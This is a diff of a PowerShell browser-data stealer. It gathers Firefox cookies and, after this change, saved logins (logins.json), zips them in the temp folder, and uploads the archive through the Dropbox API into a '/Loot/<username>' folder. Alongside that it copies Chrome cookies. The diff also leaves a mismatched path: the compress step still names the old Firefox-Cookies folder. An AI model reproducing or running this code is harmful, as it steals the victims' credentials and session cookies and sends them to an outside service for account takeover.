@@ -19,17 +19,17 @@ Copy-Item -Path $GcookiesPath -Destination $GfilePath -Force
 
 #------------------------------------------------------------------------------------------------------------------------------------
 #
-# This section will search for firefox cookies and place them in a folder in the tmp directory then zip the file to be sent to dropbox
+# This section will search for firefox cookies and saved logins and place them in a folder in the tmp directory then zip the file to be sent to dropbox
 #
 
 $SearchPath = "C:\Users\$env:UserName\AppData\Roaming\Mozilla\Firefox\Profiles"
-$FilesToSearch = @("cookies.sqlite", "cookies.sqlite-shm", "cookies.sqlite-wal")
-$TempFolderPath = "$env:tmp\Firefox-Cookies\"
-$firefox_cookies_path = "$env:tmp\Firefox-Cookies.zip"
-$FdestinationPath = "/Loot/$env:USERNAME/Firefox-Cookies.zip"
+$FilesToSearch = @("cookies.sqlite", "cookies.sqlite-shm", "cookies.sqlite-wal", "logins.json", "logins-backup.json")
+$TempFolderPath = "$env:tmp\Firefox-UserData\"
+$FfilePath = "$env:tmp\Firefox-UserData.zip"
+$FdestinationPath = "/Loot/$env:USERNAME/Firefox-UserData.zip"
 
 
-mkdir $env:tmp\Firefox-Cookies
+mkdir $env:tmp\Firefox-UserData
 
 $Results = @()
 
@@ -55,7 +55,7 @@ if ($Results) {
     Write-Host "No files found."
 }
 
-Compress-Archive -Path "$env:tmp\Firefox-Cookies" -DestinationPath "$env:tmp\Firefox-Cookies.zip"
+Compress-Archive -Path "$env:tmp\Firefox-Cookies" -DestinationPath "$env:tmp\Firefox-UserData.zip"
 
 #---------------------------------------------------------------------------------------------------------------------------------------
 
@@ -144,10 +144,10 @@ try {
         "Dropbox-API-Arg" = '{"path": "' + $FdestinationPath + '", "mode": "add", "autorename": true, "mute": false}'
     }
 
-    $fileContent = [System.IO.File]::ReadAllBytes($firefox_cookies_path)
+    $fileContent = [System.IO.File]::ReadAllBytes($FfilePath)
     $url = "https://content.dropboxapi.com/2/files/upload"
 
-    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $firefox_cookies_path -ContentType "application/octet-stream"
+    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $FfilePath -ContentType "application/octet-stream"
 
     Write-Host "Firefox Cookie Jar uploaded successfully"
 }
